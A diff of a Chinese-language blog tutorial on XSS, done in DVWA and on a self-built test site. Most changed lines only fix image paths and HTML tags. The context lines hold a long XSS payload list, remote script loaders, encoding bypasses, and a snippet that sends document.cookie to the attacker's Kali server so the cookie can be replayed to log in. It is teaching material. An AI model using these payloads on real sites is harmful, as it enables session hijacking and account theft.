@@ -513,21 +513,21 @@ XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 ">
 <h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码。</p>
 <p>反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p>
 <p><strong>分析源码</strong></p>
-<p><img src="./day29/image-20210927142651609.png" alt="image-20210927142651609"></p>
+<p><img src="/2021/09/22/day29/image-20210927142651609.png" alt="image-20210927142651609"></p>
 <p>我们直接构造标签即可</p>
 <p>构造时发现对长度有限制，我们看看是否是前端做的限制</p>
-<p><img src="./day29/image-20210927142816864.png" alt="image-20210927142816864"></p>
+<p><img src="/2021/09/22/day29/image-20210927142816864.png" alt="image-20210927142816864"></p>
 <p>时前端做的，我们把maxlength删掉</p>
-<p><img src="./day29/image-20210927142900717.png" alt="image-20210927142900717"></p>
+<p><img src="/2021/09/22/day29/image-20210927142900717.png" alt="image-20210927142900717"></p>
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里</p>
 <p>如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p>
 <p><strong>源码分析</strong></p>
-<p><img src="./day29/image-20210927143442659.png" alt="image-20210927143442659"></p>
+<p><img src="/2021/09/22/day29/image-20210927143442659.png" alt="image-20210927143442659"></p>
 <p>浏览器访问改页面时，插入数据库中的语句未作处理直接输出到页面</p>
-<p><img src="./day29/image-20210927143627694.png" alt="image-20210927143627694"></p>
-<p><img src="./day29/image-20210927143816959.png" alt="image-20210927143816959"></p>
+<p><img src="/2021/09/22/day29/image-20210927143627694.png" alt="image-20210927143627694"></p>
+<p><img src="/2021/09/22/day29/image-20210927143816959.png" alt="image-20210927143816959"></p>
 <p>浏览器访问页面发生弹窗</p>
-<p><img src="./day29/image-20210927143831750.png" alt="image-20210927143831750"></p>
+<p><img src="/2021/09/22/day29/image-20210927143831750.png" alt="image-20210927143831750"></p>
 <h3 id="dom型XSS"><a href="#dom型XSS" class="headerlink" title="dom型XSS"></a>dom型XSS</h3><p>DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p>
 <p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。</p>
 <p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。</p>
@@ -542,13 +542,13 @@ XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 ">
 </ul>
 <p><strong>源码分析：</strong></p>
 <p>DOM 型 xss 程序中，只有 html 代码，dom 通过操作 HTML 或者 css 实现 HTML属性、方法、事件，因此程序中没有与服务器进行交互。</p>
-<p><img src="./day29/image-20210927144412097.png" alt="image-20210927144412097"></p>
-<p><img src="./day29/image-20210927144643598.png" alt="image-20210927144643598"></p>
+<p><img src="/2021/09/22/day29/image-20210927144412097.png" alt="image-20210927144412097"></p>
+<p><img src="/2021/09/22/day29/image-20210927144643598.png" alt="image-20210927144643598"></p>
 <p>我们闭合引号构造即可，这里看出时单引号闭合</p>
 <p>我们通过事件</p>
-<p><img src="./day29/image-20210927145755838.png" alt="image-20210927145755838"></p>
-<p><img src="./day29/image-20210927150650000.png" alt="image-20210927150650000"></p>
-<p><img src="./day29/image-20210927150700194.png" alt="image-20210927150700194"></p>
+<p><img src="/2021/09/22/day29/image-20210927145755838.png" alt="image-20210927145755838"></p>
+<p><img src="/2021/09/22/day29/image-20210927150650000.png" alt="image-20210927150650000"></p>
+<p><img src="/2021/09/22/day29/image-20210927150700194.png" alt="image-20210927150700194"></p>
 <p>点击即可弹窗</p>
 <h2 id="xss测试语句"><a href="#xss测试语句" class="headerlink" title="xss测试语句"></a>xss测试语句</h2><p>在网站是否存在 xss 漏洞时，应该输入一些标签如&lt;、&gt;输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞。</p>
 <p>常用的测试语句</p>
@@ -620,7 +620,7 @@ XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 ">
 <p>&lt;SCRIPT/SRC=”<a href="http://3w.org/XSS/xss.js&quot;>/">http://3w.org/XSS/xss.js"&gt;\</a></p>
 <p>(23)双开括号&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</p>
 <p>(24)无结束脚本标记(仅火狐等浏览器)</p>
-<p>&lt;SCRIPT SRC<a target="_blank" rel="noopener" href="http://3w.org/XSS/xss.js?%5C">http://3w.org/XSS/xss.js?\</a><b></b></p><b>
+<p>&lt;SCRIPT SRC<a target="_blank" rel="noopener" href="http://3w.org/XSS/xss.js?%5C">http://3w.org/XSS/xss.js?\</a><b></b></p>
 <p>(25)无结束脚本标记 2</p>
 <p>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</p>
 <p>(26)半开的 HTML/JavaScript XSS</p>
@@ -650,7 +650,7 @@ XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 ">
 <p>(38)远程样式表</p>
 <p>&lt;LINK REL=”stylesheet” HREF=”<a href="http://3w.org/xss.css&quot;>">http://3w.org/xss.css"&gt;</a></p>
 <p>(39)List-style-image(列表式)</p>
-<p>&lt;STYLE&gt;li {list-style-image: url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;</p><ul>&lt;LI&gt;XSS<p></p>
+<p>&lt;STYLE&gt;li {list-style-image: url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;</p><ul>&lt;LI&gt;XSS</ul><p></p>
 <p>(40)IMG VBscript</p>
 <p>&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</p>
 <p>(41)META 链接 url</p>
@@ -733,12 +733,12 @@ img.src="http://这里写kali的ip?"+escape(document.cookie);
 document.body.appendChild(img);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>通过sudo python -m SimpleHTTPServer 80 命令打开小型web服务</p>
-<p><img src="./day29/image-20210927152848543.png" alt="image-20210927152848543"></p>
-<p><img src="./day29/image-20210927152929135.png" alt="image-20210927152929135"></p>
+<p><img src="/2021/09/22/day29/image-20210927152848543.png" alt="image-20210927152848543"></p>
+<p><img src="/2021/09/22/day29/image-20210927152929135.png" alt="image-20210927152929135"></p>
 <p>在dvwa后台插入xss代码</p>
-<p><img src="./day29/image-20210927153106702.png" alt="image-20210927153106702"></p>
+<p><img src="/2021/09/22/day29/image-20210927153106702.png" alt="image-20210927153106702"></p>
 <p>这里前端也做了长度限制，我们还是一样，把maxlength删掉即可</p>
-<p><img src="./day29/image-20210927153357563.png" alt="image-20210927153357563"></p>
+<p><img src="/2021/09/22/day29/image-20210927153357563.png" alt="image-20210927153357563"></p>
 <p>可以看到xss.js被加载了，拿到了cookie，他会发送到我们kali开启的小型服务器上</p>
 <h2 id="加载远程攻击的-paylod"><a href="#加载远程攻击的-paylod" class="headerlink" title="加载远程攻击的 paylod"></a>加载远程攻击的 paylod</h2><h3 id="常见的标准-payload"><a href="#常见的标准-payload" class="headerlink" title="常见的标准 payload"></a>常见的标准 payload</h3><p>注意 网站采用的协议。</p>
 <p>&lt;script src=”<a href="http://192.168.0.121/xss.js&quot;>/">http://192.168.0.121/xss.js"&gt;\</a></p>
@@ -761,12 +761,12 @@ document.body.appendChild(img);<span aria-hidden="true" class="line-numbers-rows
 <h3 id="jquery-加载"><a href="#jquery-加载" class="headerlink" title="jquery 加载"></a>jquery 加载</h3><p>&lt;script&gt;$.getScript(“//<a target="_blank" rel="noopener" href="http://www.xsstools.com/amER&quot;);/">www.xsstools.com/amER");\</a></p>
 <h2 id="搭建-xss-漏洞利用平台"><a href="#搭建-xss-漏洞利用平台" class="headerlink" title="搭建 xss 漏洞利用平台"></a>搭建 xss 漏洞利用平台</h2><p>xss 漏洞利用平台,集合了 xss 攻击的多种方法，很方便快捷的利用 xss 漏洞，生成攻击代码。</p>
 <p>利用phpstuday搭建</p>
-<p><img src="./day29/image-20210927153907425.png" alt="image-20210927153907425"></p>
-<p><img src="./day29/image-20210927154122923.png" alt="image-20210927154122923"></p>
-<p><img src="./day29/image-20210927154155556.png" alt="image-20210927154155556"></p>
-<p><img src="./day29/image-20210927154402440.png" alt="image-20210927154402440"></p>
+<p><img src="/2021/09/22/day29/image-20210927153907425.png" alt="image-20210927153907425"></p>
+<p><img src="/2021/09/22/day29/image-20210927154122923.png" alt="image-20210927154122923"></p>
+<p><img src="/2021/09/22/day29/image-20210927154155556.png" alt="image-20210927154155556"></p>
+<p><img src="/2021/09/22/day29/image-20210927154402440.png" alt="image-20210927154402440"></p>
 <p>我们将利用代码写入</p>
-<p><img src="./day29/image-20210927154427241.png" alt="image-20210927154427241"></p>
+<p><img src="/2021/09/22/day29/image-20210927154427241.png" alt="image-20210927154427241"></p>
 <p>可以看到cookie被发送过来</p>
 <p>我们利用cookie就可以登录，只需要在登陆时替换掉cookie即可</p>
 <h2 id="xss编码绕过"><a href="#xss编码绕过" class="headerlink" title="xss编码绕过"></a>xss编码绕过</h2><h3 id="gpc过滤字符"><a href="#gpc过滤字符" class="headerlink" title="gpc过滤字符"></a>gpc过滤字符</h3><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，’变成\‘， xss 攻击代码不要带用单引号或双引号。</p>
@@ -779,14 +779,14 @@ document.body.appendChild(img);<span aria-hidden="true" class="line-numbers-rows
 <p>&lt;script src=<a href="http://www.xss123.com/eciAKj?1623635663>%5C">http://www.xss123.com/eciAKj?1623635663&gt;\</a></p>
 <h3 id="过滤标签"><a href="#过滤标签" class="headerlink" title="过滤标签"></a>过滤标签</h3><p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在 html 执行。</p>
 <p>把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用&lt;或 者&gt;，这两个字符被实体化后在 html 里就不能执行了。</p>
-<p><img src="./day29/image-20210927155054778.png" alt="image-20210927155054778"></p>
+<p><img src="/2021/09/22/day29/image-20210927155054778.png" alt="image-20210927155054778"></p>
 <p>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签。</p>
 <p>&lt;input type=”text” name=”username” value=”” onclick=”javascript:alert(‘xss’);”/&gt;</p>
 <p>我们使用事件也可以造成xss</p>
 <h3 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h3><p>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</p>
 <h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>&lt;a href=”javascript:%61%6c%65%72%74%28%32%29”&gt;123&lt;/a&gt;</p>
 <h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p><a target="_blank" rel="noopener" href="https://www.jb51.net/tools/zhuanhuan.htm">https://www.jb51.net/tools/zhuanhuan.htm</a></p>
-<p><img src="./day29/image-20210927155302828.png" alt="image-20210927155302828"></p>
+<p><img src="/2021/09/22/day29/image-20210927155302828.png" alt="image-20210927155302828"></p>
 <p>八进制编码</p>
 <p>&lt;script&gt;eval(“\141\154\145\162\164\50\61\51”);&lt;/script&gt;</p>
 <p>十六进制编码</p>
@@ -808,39 +808,39 @@ document.body.appendChild(img);<span aria-hidden="true" class="line-numbers-rows
 &lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><p>我们搭建一个站，在上面挖掘xss</p>
-<p><img src="./day29/image-20210927155802805.png" alt="image-20210927155802805"></p>
+<p><img src="/2021/09/22/day29/image-20210927155802805.png" alt="image-20210927155802805"></p>
 <h3 id="反射性XSS挖掘"><a href="#反射性XSS挖掘" class="headerlink" title="反射性XSS挖掘"></a>反射性XSS挖掘</h3><p>1.寻找用户能够输入，在客户端可控的输入点。</p>
 <p>2.输入恶意参数后，能够原型输出，输入没有过滤恶意代码。</p>
 <p>我们寻找能够控制的输入点，我们首先在url上下手，构造一个参数</p>
-<p><img src="./day29/image-20211020144001227.png" alt="image-20211020144001227"></p>
+<p><img src="/2021/09/22/day29/image-20211020144001227.png" alt="image-20211020144001227"></p>
 <p>我们尝试闭合a标签后构造语句</p>
 <pre class="line-numbers language-none"><code class="language-none">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>输入到url后无变化，猜测被过滤了</p>
-<p><img src="./day29/image-20211020144150565.png" alt="image-20211020144150565"></p>
+<p><img src="/2021/09/22/day29/image-20211020144150565.png" alt="image-20211020144150565"></p>
 <p>查看源码后发现果然被过滤了</p>
-<p><img src="./day29/image-20211020144231451.png" alt="image-20211020144231451"></p>
+<p><img src="/2021/09/22/day29/image-20211020144231451.png" alt="image-20211020144231451"></p>
 <p>这里我们是吧语句插入到了参数里，经过尝试发现当参数语句一起出现时会被过滤，我们直接构造语句不使用参数发现不被过滤</p>
-<p><img src="./day29/image-20211020144447711.png" alt="image-20211020144447711"></p>
-<p><img src="./day29/image-20211020144521856.png" alt="image-20211020144521856"></p>
+<p><img src="/2021/09/22/day29/image-20211020144447711.png" alt="image-20211020144447711"></p>
+<p><img src="/2021/09/22/day29/image-20211020144521856.png" alt="image-20211020144521856"></p>
 <p>这是第一个反射xss</p>
 <p>接下来我们继续寻找</p>
-<p><img src="./day29/image-20211020145017223.png" alt="image-20211020145017223"></p>
+<p><img src="/2021/09/22/day29/image-20211020145017223.png" alt="image-20211020145017223"></p>
 <p>点击这里后，我们又发现了一个可控参数</p>
-<p><img src="./day29/image-20211020145103699.png" alt="image-20211020145103699"></p>
+<p><img src="/2021/09/22/day29/image-20211020145103699.png" alt="image-20211020145103699"></p>
 <p>我们在源码中查看，发现了他的位置</p>
-<p><img src="./day29/image-20211020145200315.png" alt="image-20211020145200315"></p>
+<p><img src="/2021/09/22/day29/image-20211020145200315.png" alt="image-20211020145200315"></p>
 <p>想要利用我们首先得闭合，但是这里发现单引号双引号都被转义了，无法闭合</p>
-<p><img src="./day29/image-20211020145521690.png" alt="image-20211020145521690"></p>
+<p><img src="/2021/09/22/day29/image-20211020145521690.png" alt="image-20211020145521690"></p>
 <p>这里也不能删除参数，不太能利用</p>
 <p>我们继续寻找</p>
-<p><img src="./day29/image-20211020150652592.png" alt="image-20211020150652592"></p>
+<p><img src="/2021/09/22/day29/image-20211020150652592.png" alt="image-20211020150652592"></p>
 <p>这里有个登录，我们抓包看看</p>
-<p><img src="./day29/image-20211020150948574.png" alt="image-20211020150948574"></p>
-<p><img src="./day29/image-20211020151213053.png" alt="image-20211020151213053"></p>
-<p><img src="./day29/image-20211020151227215.png" alt="image-20211020151227215"></p>
+<p><img src="/2021/09/22/day29/image-20211020150948574.png" alt="image-20211020150948574"></p>
+<p><img src="/2021/09/22/day29/image-20211020151213053.png" alt="image-20211020151213053"></p>
+<p><img src="/2021/09/22/day29/image-20211020151227215.png" alt="image-20211020151227215"></p>
 <p>成功弹窗了</p>
-</ul></b>
+
                 
             </div>
             <hr/>
